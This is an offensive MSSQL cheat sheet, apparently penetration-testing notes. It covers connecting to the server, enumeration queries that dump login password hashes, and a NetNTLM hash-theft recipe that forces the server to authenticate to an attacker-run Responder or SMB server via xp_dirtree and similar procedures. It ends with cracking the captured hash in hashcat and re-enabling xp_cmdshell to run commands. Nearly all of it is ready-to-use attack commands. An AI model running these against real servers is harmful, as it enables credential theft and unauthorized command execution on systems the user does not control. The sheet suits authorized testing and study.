# MSSQL

## Connection
```sh
# mssqlclient
impacket-mssqlclient <domain>/<username>:<password>@<ip>

# sqlcmd
sqlcmd -S <IP> -U <username> -P <password> -d <database_name> -Q <query>
```

## Enumeration
```sql
-- Get version
SELECT @@version;

-- Get username
SELECT user_name();

-- Get databases
SELECT name FROM master.dbo.sysdatabases;
SELECT * FROM information_schema.schemata;

-- Tables from DB
SELECT * FROM information_schema.tables;

-- Columns from table
SELECT * FROM information_schema.columns;

-- List users
SELECT sp.name AS LOGIN, sp.type_desc AS LOGIN_TYPE, sl.password_hash, sp.create_date, sp.modify_date, CASE WHEN sp.is_disabled = 1 THEN "Disabled" ELSE "Enabled" END AS STATUS FROM sys.server_principals sp LEFT JOIN sys.sql_logins sl ON sp.principal_id = sl.principal_id WHERE sp.type NOT IN ("G", "R") ORDER BY sp.name;

-- Users and roles
SELECT * FROM sys.database_principals;
```

## Steal NetNTLM hash
When executing a command on the SQL server which requests resources from the attacker's SMB server, the hash will be captured on that server.
1. Start an **SMB server** to capture hash upon request *(local)*.
    ```sh
    # Responder.py
    sudo python3 Responder.py -I tun0

    # impacket-smbserver
    sudo impacket-smbserver share ./ -smb2support
    ```
2. Run one of the following commands *(remote)*.
    ```sql
    xp_dirtree "\\<IP>\any\thing\"
    exec master.dbo.xp_dirtree "\\<IP>\anything\"
    EXEC master..xp_subdirs "\\<IP>\anything\"
    EXEC master..xp_fileexist "\\<IP>\anything\"
    ```
### Cracking the hash
```sh
hashcat -m 5600 <hash_file> <wordlist>
```

## Command Execution
1. If needed reactivate `xp_cmdshell`
    ```sql
    EXEC sp_configure 'show advanced options',1;
    RECONFIGURE;
    EXEC sp_configure 'xp_cmdshell',1;
    RECONFIGURE;
    ```
2. Execute command
    ```sql
    EXEC xp_cmdshell 'ping 127.0.0.1';
    ```